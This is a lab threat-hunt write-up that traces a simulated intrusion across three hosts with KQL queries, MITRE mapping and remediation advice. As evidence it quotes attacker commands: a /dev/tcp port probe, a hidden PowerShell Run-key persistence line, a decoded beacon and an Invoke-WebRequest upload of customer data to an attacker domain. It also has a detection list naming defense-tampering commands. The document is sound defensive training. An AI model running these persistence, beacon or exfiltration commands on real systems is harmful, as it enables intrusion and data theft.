# 📚 Table of Contents

- [Threat Hunt: "Northpeak Descent"](#️‍️-threat-hunt-northpeak-descent)
- [Platforms and Tools](#-platforms-and-tools)
- [Summary of Findings (Flags)](#-summary-of-findings-flags)
  - [Flag 0: Readiness Gate](#-flag-0-readiness-gate)
  - [Flag 1: The Real Foothold](#-flag-1-the-real-foothold)
  - [Flag 2: First Foothold, Ordering](#-flag-2-first-foothold-ordering)
  - [Flag 3: Operator Workstation Name](#-flag-3-operator-workstation-name)
  - [Flag 4: SRV01 Access Vector](#-flag-4-srv01-access-vector)
  - [Flag 5: Sudo Enumeration](#-flag-5-sudo-enumeration)
  - [Flag 6: Reachability Technique](#-flag-6-reachability-technique)
  - [Flag 7: Operator Tooling](#-flag-7-operator-tooling)
  - [Flag 8: Lateral Movement Triple](#-flag-8-lateral-movement-triple)
  - [Flag 9: Operator PowerShell Lineage](#-flag-9-operator-powershell-lineage)
  - [Flag 10: Persistence Full Command](#-flag-10-persistence-full-command)
  - [Flag 11: Beacon Domains, Cross-Source](#-flag-11-beacon-domains-cross-source)
  - [Flag 12: Encoded Beacon Decode](#-flag-12-encoded-beacon-decode)
  - [Flag 13: Encoded-Command Discrimination](#-flag-13-encoded-command-discrimination)
  - [Flag 14: Beacon Rhythm](#-flag-14-beacon-rhythm)
  - [Flag 15: Crown Jewel Exfil](#-flag-15-crown-jewel-exfil)
  - [Flag 16: Exfil Session Correlation](#-flag-16-exfil-session-correlation)
  - [Flag 17: Holding the Ground](#-flag-17-holding-the-ground)
  - [Flag 18: Confirming the Foothold's Rights](#-flag-18-confirming-the-footholds-rights)
- [MITRE ATT&CK Technique Mapping](#-mitre-attck-technique-mapping)
- [Conclusion](#-conclusion)
- [Lessons Learned](#-lessons-learned)
- [Recommendations for Remediation](#️-recommendations-for-remediation)

---

# 🕵️‍♂️ Threat Hunt: *"Northpeak Descent"*

## Scenario

> *"Night shift already logged a cause on this one. I'm not sold. Work the incident yourself, follow the evidence, and tell me what actually happened, in order."*

Overnight the estate lit up. A cross-platform intrusion using valid accounts ran a chain that reaches from a quiet foothold through to impact. The queue is loud, and command already has a theory — but the evidence tells a different story. What looked like routine noise was a disciplined, hands-on operator moving from a single stolen login through host-to-host movement, persistence, an obfuscated command channel, and the theft of customer data — all without ever going near the security stack.

This report reconstructs the full timeline across three hosts — **`npt-ws01`**, **`npt-srv01`**, and **`npt-linux01`** — and reaches a judgement the night shift missed.

This report includes:

- 📅 Timeline reconstruction of initial access, reconnaissance, pivot, persistence, C2, and exfiltration
- 📜 Detailed queries using Microsoft Sentinel and Defender XDR Advanced Hunting (KQL)
- 🎯 MITRE ATT&CK mapping to understand TTP alignment
- 🧪 Evidence-based summaries supporting each flag and behavior discovered

---

## 🧰 Platforms and Tools

**Analysis Environment:**
- Microsoft Sentinel
- Microsoft Defender for Endpoint (Defender XDR)
- Log Analytics Workspace (`law-cyber-range`)
- Azure

**Techniques Used:**
- Kusto Query Language (KQL)
- Behavioral analysis of endpoint logs (`DeviceLogonEvents`, `DeviceProcessEvents`, `DeviceNetworkEvents`, `DeviceRegistryEvents`, `DeviceFileEvents`, `DeviceEvents`)
- PowerShell deobfuscation (base64 / UTF-16LE)
- Cross-console pivoting between Sentinel and MDE

---

## 📔 Summary of Findings (Flags)

| Flag | Objective | Finding | Timestamp |
|------|-----------|---------|-----------|
| 0 | Readiness Gate | Acknowledged with the brief's phrase `Northpeak hunter ready` | — |
| 1 | The Real Foothold | External `148.64.103.173` entered cleanly over RDP as `sancadmin` | `2026-06-16 20:58 UTC` |
| 2 | First Foothold, Ordering | `npt-ws01` was hit first — not the Linux box the queue assumed | `2026-06-16 20:57:54 UTC` |
| 3 | Operator Workstation Name | Attacker's own machine name `loranse` leaked via `RemoteDeviceName` | `2026-06-16` |
| 4 | SRV01 Access Vector | Server reached **directly** from external IP over RDP, not by pivot | `2026-06-16 21:58 UTC` |
| 5 | Sudo Enumeration | `sudo -l` run on `npt-linux01` (fumbled `sudo -1` first) | `2026-06-16 22:16 UTC` |
| 6 | Reachability Technique | `/dev/tcp` bash built-in probing port `3389` (RDP) | `2026-06-16 22:21 UTC` |
| 7 | Operator Tooling | `netexec` installed via `pipx` after checking for `xfreerdp` | `2026-06-16 22:29 UTC` |
| 8 | Lateral Movement Triple | `sancadmin` pivoted from internal `10.2.0.30` into `npt-ws01` | `2026-06-16 22:32 UTC` |
| 9 | Operator PowerShell Lineage | `explorer.exe` (interactive) as `sancadmin` = the human at the keyboard | `2026-06-16 22:43 UTC` |
| 10 | Persistence Full Command | HKCU Run key launching `NorthpeakSyncTray.ps1` (hidden PowerShell) | `2026-06-16 23:04 UTC` |
| 11 | Beacon Domains, Cross-Source | `status` / `updates` / `cdn` `.sync-northpeak.com`; source `InitiatingProcessCommandLine` | `2026-06-16 23:15 UTC` |
| 12 | Encoded Beacon Decode | UTF-16LE base64 decoded to `https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09` | `2026-06-16 23:19 UTC` |
| 13 | Encoded-Command Discrimination | `gc_worker.exe` generated the benign encoded chatter (12 vs operator's 3) | `2026-06-16` |
| 14 | Beacon Rhythm | Regular interval = automated beaconing (scripted, not human) | `2026-06-16 23:15 UTC` |
| 15 | Crown Jewel Exfil | `customer_data_export_20260616.csv` uploaded from `npt-srv01` to `cdn.sync-northpeak.com` | `2026-06-16 18:44 UTC` |
| 16 | Exfil Session Correlation | Exfil occurred in the **second** (re-entry) RDP session | `2026-06-16 18:42 UTC` |
| 17 | Holding the Ground | No defense tampering, no dropped binary — living off the land with valid accounts | `2026-06-16` |
| 18 | Confirming the Foothold's Rights | `whoami /groups` filtered for SID `S-1-5-32-544` (local admin) | `2026-06-16 22:43 UTC` |

---

### 🚩 Flag 0: Readiness Gate

**Objective:**
Acknowledge the incident handoff and confirm readiness to work the hunt.

**Flag Value:**
`Northpeak hunter ready`

**Detection Strategy:**
The gate phrase is embedded in the incident brief. Reading the brief in full — and confirming the shared `law-cyber-range` workspace could be queried and scoped to the Northpeak hosts — was the prerequisite before touching any telemetry.

**Why This Matters:**
Every query in this hunt must be scoped to the Northpeak hosts (`npt-ws01`, `npt-srv01`, `npt-linux01`) because the workspace is shared. Establishing scope up front prevents reading other estates' data and chasing false leads.

---

### 🚩 Flag 1: The Real Foothold

**Objective:**
Identify the external source that got onto the Windows estate cleanly and how they came through.

**Flag Value:**
`148.64.103.173, RDP`

**Detection Strategy:**
The estate is internal `10.x`, so any **public** source IP authenticating in is immediately suspect. Defender labels each IP with `RemoteIPType`, so filtering to `RemoteIPType == "Public"` isolates external logins in a single step. The surviving row shows `sancadmin` logging in with `LogonType == RemoteInteractive` — the log's term for a Remote Desktop (RDP) session.

**KQLQuery:**
```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where RemoteIPType == "Public"
| where ActionType == "LogonSuccess"
| project Timestamp, DeviceName, AccountName, RemoteIP, LogonType
| sort by Timestamp asc
```

**Evidence:**
<img width="711" height="327" alt="q1" src="https://github.com/user-attachments/assets/033c98d4-354f-40aa-8d68-ecb3094b189e" />


**Why This Matters:**
`RemoteInteractive` = RDP. A public IP opening a hands-on remote session with a valid account is the definition of a clean, credential-based foothold — no exploit required. This IP and account become the thread pulled through the rest of the investigation.

---

### 🚩 Flag 2: First Foothold, Ordering

**Objective:**
Prove which host the attacker landed on first, rather than trusting the "obvious" story.

**Flag Value:**
`npt-ws01, 148.64.103.173`

**Detection Strategy:**
The hunt lead warns the obvious story has the Linux box first. Instead of assuming, the earliest login per host is computed with `summarize min(Timestamp) by DeviceName`. The result is unambiguous: `npt-ws01` at 8:57 PM, `npt-srv01` at 9:58, `npt-linux01` last at 10:01.

**KQLQuery:**
```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName has_any ("npt-ws01","npt-srv01","npt-linux01")
| where RemoteIP == "148.64.103.173"
| where ActionType == "LogonSuccess"
| summarize FirstSeen = min(Timestamp) by DeviceName
| sort by FirstSeen asc
```

**Evidence:**

<img width="450" height="223" alt="q2" src="https://github.com/user-attachments/assets/18099c9a-b456-42c8-82fa-a37eda3614dd" />

**Why This Matters:**
Timestamps beat theories. The Linux box had activity, but activity is not the same as being first — the Windows workstation was patient zero by a full hour. `min(Timestamp)` is the reliable way to prove ordering.

---

### 🚩 Flag 3: Operator Workstation Name

**Objective:**
Name the attacker's own machine, which announced itself on every remote session.

**Flag Value:**
`loranse`

**Detection Strategy:**
An RDP client reports its own hostname to the target, and Defender stores it in `RemoteDeviceName`. Subtracting the legitimate estate hosts (`!startswith "npt-"`) leaves only the foreign machine name.

**KQLQuery:**
```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where RemoteIP == "148.64.103.173"
| where isnotempty(RemoteDeviceName)
| where RemoteDeviceName !startswith "npt-"
| distinct RemoteDeviceName
```

**Evidence:**

<img width="499" height="142" alt="q3" src="https://github.com/user-attachments/assets/5bc0323d-b005-4eda-b911-0bdd5477c48d" />

**Why This Matters:**
The operator's own device (`loranse`) is a strong attribution artifact. The lesson: an empty field is often a too-tight filter, not missing data — loosening the filter surfaced the name.

---

### 🚩 Flag 4: SRV01 Access Vector

**Objective:**
Reconstruct how the server was reached — the method, the source, the session type.

**Flag Value:**
`RDP, 148.64.103.173, RemoteInteractive`

**Detection Strategy:**
The question hinges on whether the server was pivoted to internally or hit directly. Filtering the server's successful logins shows the source is the **external** `148.64.103.173`, not an internal `10.x` address — so it was reached directly, over RDP.

**KQLQuery:**
```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-srv01"
| where ActionType == "LogonSuccess"
| where RemoteIP == "148.64.103.173"
| project Timestamp, AccountName, RemoteIP, LogonType, RemoteDeviceName
| sort by Timestamp asc
```

**Evidence:**

<img width="1010" height="470" alt="q4" src="https://github.com/user-attachments/assets/2fc23117-d64f-47b4-aacf-1e7a6329d9b6" />

**Why This Matters:**
Both Windows hosts were compromised directly from the internet with stolen credentials — not via lateral movement. Knowing what *wasn't* a pivot is as important as knowing what was. A `Network` → `RemoteInteractive` burst from one source is the RDP fingerprint.

---

### 🚩 Flag 5: Sudo Enumeration

**Objective:**
Identify the first privilege-escalation check on the Linux host.

**Flag Value:**
`sudo -l`

**Detection Strategy:**
`sudo -l` lists what a user may run as sudo — the textbook first escalation check. The tell in the logs is a fumble-then-fix: `sudo -1` (digit one, invalid) five minutes before `sudo -l` (letter L).

**KQLQuery:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-linux01"
| where ProcessCommandLine has "sudo"
| project Timestamp, AccountName, ProcessCommandLine
| sort by Timestamp asc
```

**Evidence:**

<img width="597" height="222" alt="q5" src="https://github.com/user-attachments/assets/2c68e2f7-5adb-4dba-917c-67afee1cdc1a" />

**Why This Matters:**
A typo immediately followed by a correction is a hands-on-keyboard fingerprint — automation does not fat-finger flags. It confirms a live human and identifies the intended command.

---

### 🚩 Flag 6: Reachability Technique

**Objective:**
Determine how the attacker checked whether the Windows boxes were reachable, and the port they cared about.

**Flag Value:**
`/dev/tcp, 3389`

**Detection Strategy:**
No scanner was dropped — the reachability check uses bash's built-in `/dev/tcp`: `echo > /dev/tcp/10.2.0.10/3389`. Searching for that mechanism (and the RDP/SMB ports) surfaces the probe.

**KQLQuery:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-linux01"
| where ProcessCommandLine has_any ("/dev/tcp","3389","445")
| project Timestamp, AccountName, ProcessCommandLine
| sort by Timestamp asc
```

**Evidence:**

<img width="743" height="411" alt="q6" src="https://github.com/user-attachments/assets/3384a207-3007-469d-868f-823e52902d58" />

**Why This Matters:**
`/dev/tcp` is a no-tool port scanner — living off the land. The port they probe reveals intent: **3389 = an RDP pivot** was being lined up against the Windows subnet (`10.2.0.10`, `10.2.0.20`).

---

### 🚩 Flag 7: Operator Tooling

**Objective:**
Name the tool the operator installed before leaving the Linux host.

**Flag Value:**
`netexec`

**Detection Strategy:**
The logs show them *checking for* tools (`which xfreerdp`, `which nxc netexec crackmapexec`) and then *installing* one (`pipx install netexec`). Cutting 598 noisy rows to the answer used the noise toolkit: filter to the attacker account, narrow `install` → `pipx install`, and `| distinct`.

**KQLQuery:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-linux01"
| where AccountName == "sancadmin"
| where ProcessCommandLine has_any ("which","command -v","pipx install","apt-get install")
| distinct ProcessCommandLine
```

**Evidence:**

<img width="492" height="190" alt="q7" src="https://github.com/user-attachments/assets/0c9d0f7e-55dc-497b-ab9d-13241cc94e17" />

**Why This Matters:**
`which` is shopping; `install` is buying. NetExec (formerly CrackMapExec) is a Swiss-army AD attack tool — installing it right after probing RDP shows the operator arming for the Windows pivot.

---

### 🚩 Flag 8: Lateral Movement Triple

**Objective:**
Build the internal hop back into the workstation: account, internal source, target.

**Flag Value:**
`sancadmin, 10.2.0.30, npt-ws01`
`2026-06-16T22:32:18Z`

**Detection Strategy:**
The signature of a pivot is the source IP flipping from external to internal. Filtering the workstation's logins to internal `10.x` sources (excluding the external IP) reveals `sancadmin` from `10.2.0.30` (the Linux box) over `Network` (SMB) — NetExec in action.

**KQLQuery:**
```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-ws01"
| where ActionType == "LogonSuccess"
| where RemoteIP != "148.64.103.173"
| where RemoteIP startswith "10."
| project Timestamp, AccountName, RemoteIP, LogonType
| sort by Timestamp asc
```

**Evidence:**

<img alt="Flag 8 - internal pivot to ws01" src="./images/flag08.png" />

**Why This Matters:**
The source IP tells the phase: external = getting in, internal `10.x` = spreading. The `Network` logon type (not RemoteInteractive) confirms a tool authenticating over SMB rather than a person opening a desktop.

---

### 🚩 Flag 9: Operator PowerShell Lineage

**Objective:**
Separate the human operator's PowerShell from the machine's own automation.

**Flag Value:**
`explorer.exe`
`2026-06-16T22:43:00Z`

**Detection Strategy:**
Grouping PowerShell by parent process and account splits automation from the human. Every parent runs as `SYSTEM` except `explorer.exe` — the interactive desktop shell — running as `sancadmin`, meaning a person launched PowerShell by hand.

**KQLQuery:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-ws01"
| where FileName in~ ("powershell.exe","pwsh.exe")
| summarize Count = count(), Accounts = make_set(AccountName) by InitiatingProcessFileName
| sort by Count asc
```

**Evidence:**

<img alt="Flag 9 - explorer.exe parent" src="./images/flag09.png" />

**Why This Matters:**
`explorer.exe` as a parent means an interactive human session — a reliable hands-on-keyboard fingerprint. When a host is drowning in a common tool, the anomaly lives in the lineage, not the command text.

---

### 🚩 Flag 10: Persistence Full Command

**Objective:**
Recover the full command the attacker planted to survive a reboot.

**Flag Value:**
`powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1"`
`2026-06-16T23:04:16Z`

**Detection Strategy:**
Logon persistence on the user's own profile points to the HKCU Run key. The disguise is in the value *name* (`NorthpeakSyncTray`); the real command lives in `RegistryValueData`.

**KQLQuery:**
```kql
DeviceRegistryEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-ws01"
| where RegistryKey has "Run"
| project Timestamp, InitiatingProcessAccountName, RegistryKey, RegistryValueName, RegistryValueData
| sort by Timestamp asc
```

**Evidence:**

<img alt="Flag 10 - HKCU Run key persistence" src="./images/flag10.png" />

**Why This Matters:**
The HKCU Run key runs at every logon for that user — per-user persistence needing no admin rights. The stealth flags (`-WindowStyle Hidden`, `-ExecutionPolicy Bypass`) and a benign-sounding name are classic disguise; the payload is the whole command line, not just the script path.

---

### 🚩 Flag 11: Beacon Domains, Cross-Source

**Objective:**
Find all three look-alike C2 subdomains and where the two the network missed were hiding.

**Flag Value:**
`status.sync-northpeak.com, updates.sync-northpeak.com, cdn.sync-northpeak.com; InitiatingProcessCommandLine`
`2026-06-16T23:15:47Z`

**Detection Strategy:**
The network table logged only `status` (the one that connected). The other two survive in the launching command — each `Invoke-WebRequest` was wrapped in a `Start-Process`, so the URL persists in `InitiatingProcessCommandLine` even without a network record.

**KQLQuery:**
```kql
DeviceEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-ws01"
| where ActionType == "PowerShellCommand"
| where AdditionalFields has "sync-northpeak"
| project Timestamp, AdditionalFields
| sort by Timestamp asc
```

**Evidence:**

<img alt="Flag 11 - three beacon domains" src="./images/flag11.png" />

**Why This Matters:**
The network view is not the whole truth — a domain only appears there if it connected. Correlating "what connected" against "what was attempted" (the launching command line) reveals the domains hiding in the gap.

---

### 🚩 Flag 12: Encoded Beacon Decode

**Objective:**
Unwrap the deliberately obfuscated beacon and recover the full URL.

**Flag Value:**
`https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09`
`2026-06-16T23:19:23Z`

**Detection Strategy:**
The wrapped beacon is a `-EncodedCommand` — base64 of **UTF-16LE** ("wide character") text. Decoding as UTF-8 yields null-byte gaps; UTF-16LE reads the URL whole. The encoded launcher lives in `DeviceProcessEvents` (the child process), and `distinct` isolates the one authoritative operator command from look-alikes.

**KQLQuery:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-ws01"
| where ProcessCommandLine has "EncodedCommand"
| where ProcessCommandLine !has "outputFormat"
| distinct ProcessCommandLine
```
```python
import base64
print(base64.b64decode(blob).decode("utf-16-le"))
# → Invoke-WebRequest -Uri "https://cdn.sync-northpeak.com/api/beacon?id=NPT-WS01&flag=NORTHPEAK-09"
```

**Evidence:**

<img alt="Flag 12 - decoded beacon" src="./images/flag12.png" />

**Why This Matters:**
PowerShell base64 is UTF-16LE — decoding "the obvious way" fails. This flag also required recovering data from **MDE** after it aged out of the Sentinel workspace, proving the two consoles retain the same events on different clocks.

---

### 🚩 Flag 13: Encoded-Command Discrimination

**Objective:**
Name what generates the benign encoded chatter, and prove it can be told apart from the operator.

**Flag Value:**
`gc_worker.exe`

**Detection Strategy:**
Most encoded PowerShell is benign Azure Guest Configuration automation. Grouping encoded commands by parent process shows a clean split: `gc_worker.exe` ×12 (system chatter, `-outputFormat xml`) versus `powershell.exe` ×3 (the operator, `-NoProfile -Bypass`).

**KQLQuery:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-ws01"
| where ProcessCommandLine has "EncodedCommand"
| summarize Count = count() by InitiatingProcessFileName
| sort by Count desc
```

**Evidence:**

<img alt="Flag 13 - gc_worker vs powershell split" src="./images/flag13.png" />

**Why This Matters:**
Encoded ≠ malicious. Establishing the benign baseline by *who ran it* is what lets the three operator commands stand out from twelve pieces of routine automation.

---

### 🚩 Flag 14: Beacon Rhythm

**Objective:**
Describe what the regular spacing between check-ins proves about the channel.

**Flag Value:**
`regular interval, automated beaconing`
`2026-06-16T23:15:47Z`

**Detection Strategy:**
Measuring the gaps between check-ins (`serialize` + `prev()` + `datetime_diff`) shows an even cadence. Regular timing is the signature of a scripted implant on a timer, not a human typing.

**KQLQuery:**
```kql
DeviceEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-ws01"
| where ActionType == "PowerShellCommand"
| extend Cmd = tostring(parse_json(AdditionalFields).Command)
| where Cmd startswith "Invoke-WebRequest" and Cmd has "status.sync-northpeak.com"
| project Timestamp
| sort by Timestamp asc
| serialize
| extend GapSeconds = datetime_diff('second', Timestamp, prev(Timestamp))
```

**Evidence:**

<img alt="Flag 14 - beacon cadence" src="./images/flag14.png" />

**Why This Matters:**
Timing regularity is itself evidence. Even, machine-precise intervals mean automation; the steady cadence ties the channel to the `NorthpeakSyncTray.ps1` persistence running on a schedule.

---

### 🚩 Flag 15: Crown Jewel Exfil

**Objective:**
Name the exfiltrated file, the host it left from, and where it went.

**Flag Value:**
`customer_data_export_20260616.csv, npt-srv01, cdn.sync-northpeak.com`
`2026-06-16T18:44:08Z`

**Detection Strategy:**
Exfil is a web request that *sends* a file — `Invoke-WebRequest ... -InFile`. Filtering for upload indicators surfaces one row amid Azure metadata noise: an upload of a customer-data CSV from the server to the C2 domain.

**KQLQuery:**
```kql
DeviceEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName has "npt"
| where ActionType == "PowerShellCommand"
| extend Cmd = tostring(parse_json(AdditionalFields).Command)
| where Cmd has_any ("-InFile","-Method Put","-Method Post","upload",".csv")
| project Timestamp, DeviceName, Cmd
| sort by Timestamp asc
```

**Evidence:**

<img alt="Flag 15 - exfil upload" src="./images/flag15.png" />

**Why This Matters:**
`-InFile` on `Invoke-WebRequest` means a file leaving the network. The destination URL (`/api/upload?host=NPT-SRV01&data=customers`) practically confesses what was taken and from where — the crown-jewel data theft.

---

### 🚩 Flag 16: Exfil Session Correlation

**Objective:**
Determine which RDP session the export was performed in — the first, or the re-entry.

**Flag Value:**
`second`
`2026-06-16T18:42:52Z`

**Detection Strategy:**
Fit the known exfil time (6:44:08 PM) between the server's RDP session boundaries: session 1 at 4:58 PM, session 2 at 6:42:52 PM. The upload lands ~76 seconds into the second session.

**KQLQuery:**
```kql
DeviceLogonEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-srv01"
| where LogonType == "RemoteInteractive"
| where ActionType == "LogonSuccess"
| project Timestamp, AccountName, RemoteIP, RemoteDeviceName
| sort by Timestamp asc
```

**Evidence:**

<img alt="Flag 16 - two RDP sessions" src="./images/flag16.png" />

**Why This Matters:**
Correlating an action to a session needs only the session start times and the action's timestamp. The tight 76-second gap between re-login and upload shows the attacker came back specifically to steal the data.

---

### 🚩 Flag 17: Holding the Ground

**Objective:**
Explain the access-and-evasion model that let them operate freely without touching the security stack.

**Flag Value:**
`security stack untouched, living off the land with valid accounts`

**Detection Strategy:**
An "absence is a finding" question. Queries for defense tampering and for dropped binaries returned only benign OS/Defender activity — no `Set-MpPreference -Disable`, no `net stop`, no attacker malware.

**KQLQuery:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName has "npt"
| where ProcessCommandLine has_any ("Set-MpPreference","DisableRealtimeMonitoring","net stop","Stop-Service","wevtutil","auditpol")
| project Timestamp, DeviceName, ProcessCommandLine
| sort by Timestamp asc
```

**Evidence:**

<img alt="Flag 17 - no tampering found" src="./images/flag17.png" />

**Why This Matters:**
The stealthiest intrusions don't disable security tools — they avoid needing to. Valid credentials plus native tools produced activity that read as normal administration, so there was nothing to disable and nothing to smuggle in. The *lack* of evasion is the evidence.

---

### 🚩 Flag 18: Confirming the Foothold's Rights

**Objective:**
Identify what the operator confirmed about their account on re-entry.

**Flag Value:**
`whoami /groups, local admin`
`2026-06-16T22:43:04Z`

**Detection Strategy:**
The re-entry burst runs `whoami` then `whoami /groups`. The operator reads the group output for the well-known SID `S-1-5-32-544` — the local Administrators group — confirming admin rights by SID rather than the localizable name.

**KQLQuery:**
```kql
DeviceProcessEvents
| where Timestamp between (datetime(2026-06-16 00:00:00) .. datetime(2026-06-17 06:00:00))
| where DeviceName == "npt-ws01"
| where ProcessCommandLine has "whoami"
| project Timestamp, AccountName, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

**Evidence:**

<img alt="Flag 18 - whoami /groups admin check" src="./images/flag18.png" />

**Why This Matters:**
`S-1-5-32-544` is the local Administrators group on every Windows machine. Checking membership by SID is language-independent — a reliable way for an operator to confirm they hold local admin before proceeding.

---

## 🎯 MITRE ATT&CK Technique Mapping

| Tactic | Technique | ID | Evidence in this hunt |
|--------|-----------|----|-----------------------|
| Initial Access | Valid Accounts | T1078 | `sancadmin` stolen creds used over RDP (Flags 1, 4) |
| Initial Access | External Remote Services | T1133 | RDP from public `148.64.103.173` (Flag 1) |
| Discovery | Permission Groups Discovery | T1069 | `whoami /groups` for SID `S-1-5-32-544` (Flag 18) |
| Discovery | System Owner/User Discovery | T1033 | `sudo -l`, `whoami` (Flags 5, 18) |
| Discovery | Network Service Discovery | T1046 | `/dev/tcp` port probe on 3389 (Flag 6) |
| Lateral Movement | Remote Services: SMB | T1021.002 | NetExec pivot from `10.2.0.30` (Flag 8) |
| Lateral Movement | Remote Services: RDP | T1021.001 | Direct RDP to both Windows hosts (Flags 1, 4) |
| Execution | Command & Scripting Interpreter: PowerShell | T1059.001 | Operator PowerShell via `explorer.exe` (Flag 9) |
| Persistence | Registry Run Keys | T1547.001 | HKCU Run key `NorthpeakSyncTray` (Flag 10) |
| Defense Evasion | Obfuscated Files or Information | T1027 | UTF-16LE base64 `-EncodedCommand` (Flag 12) |
| Defense Evasion | Living off the Land / no tampering | — | No defense disabling or dropped binary (Flag 17) |
| Command & Control | Application Layer Protocol: Web | T1071.001 | `sync-northpeak.com` beacons (Flags 11–14) |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | CSV uploaded to `cdn.sync-northpeak.com` (Flag 15) |

---

## ✅ Conclusion

An operator using stolen valid credentials (`sancadmin`) from external IP `148.64.103.173` and their own machine `loranse` conducted a disciplined, hands-on, cross-platform intrusion across three Northpeak hosts on the evening of 16 June 2026. They entered directly over RDP against both Windows hosts, ran reconnaissance and installed NetExec on the Linux box, pivoted internally back into the workstation, planted a hidden Run-key backdoor, ran an automated beacon channel to look-alike `sync-northpeak.com` subdomains (one deliberately base64-obfuscated), and exfiltrated customer data from the server during a deliberate re-entry session — all without ever touching the security stack. The intrusion the queue "mistook for noise" was a deliberate living-off-the-land operation, and the "obvious story" it assumed was disproved at nearly every step by the timestamps and telemetry.

---

## 📝 Lessons Learned

- **Timestamps beat theories.** `min(Timestamp)` disproved the "Linux-first" assumption — the workstation was patient zero.
- **The source IP tells the phase.** External source = getting in; internal `10.x` source = spreading (lateral movement).
- **Regular = automation, irregular = human.** Applied to clockwork logons, scheduled encoded commands, and steady beacon cadence.
- **Parent process + account finds the human** hiding in a flood of SYSTEM-owned automation.
- **The network view isn't the whole truth.** A C2 domain only appears in network logs if it connected; obfuscated domains live in the launching command line.
- **PowerShell base64 is UTF-16LE.** Decoding the obvious way (UTF-8) yields null-byte gaps.
- **Sentinel and MDE retain the same events on different clocks.** When Sentinel's copy aged out mid-hunt, MDE's independent ~30-day window still held the evidence — always check both, and preserve artifacts before they roll off.
- **Absence is a finding.** No tampering + no malware = an attacker who never needed to evade.

---

## 🛡️ Recommendations for Remediation

- **Reset and investigate `sancadmin`.** Rotate the credential, review all its recent activity, and determine how it was stolen (the credential arrived already valid — the source is upstream of this estate).
- **Enforce MFA and Conditional Access on RDP / remote access.** The foothold was a clean credential login from a public IP; MFA and geo/velocity-based Conditional Access would have blocked or challenged it.
- **Restrict inbound RDP from the internet.** Both Windows hosts accepted RDP directly from a public address — RDP should sit behind a VPN or gateway, never exposed.
- **Remove the persistence.** Delete the HKCU Run value `NorthpeakSyncTray` and the `C:\ProgramData\Northpeak\NorthpeakSync\Bin\NorthpeakSyncTray.ps1` payload on `npt-ws01`.
- **Block the C2 infrastructure.** Sinkhole/deny the `sync-northpeak.com` domains and the external IP `148.64.103.173` at the proxy/firewall/DNS layers.
- **Alert on the behaviors, not just signatures.** Build detections for: public-IP interactive logons, `-EncodedCommand` from non-`gc_worker` parents, `Invoke-WebRequest -InFile` (upload), and HKCU Run-key writes.
- **Hunt for the stolen data's blast radius.** `customer_data_export_20260616.csv` left the estate — engage data-owner and privacy/GRC processes for breach assessment and notification obligations.
- **Baseline living-off-the-land tooling.** NetExec was installed via `pipx`; monitor package-manager installs of offensive tooling on servers.

---

*Hunt authored by Dogukan Oruc on [hunt.lognpacific.com](https://hunt.lognpacific.com). Investigation & writeup by Yetunde Odunlami.*
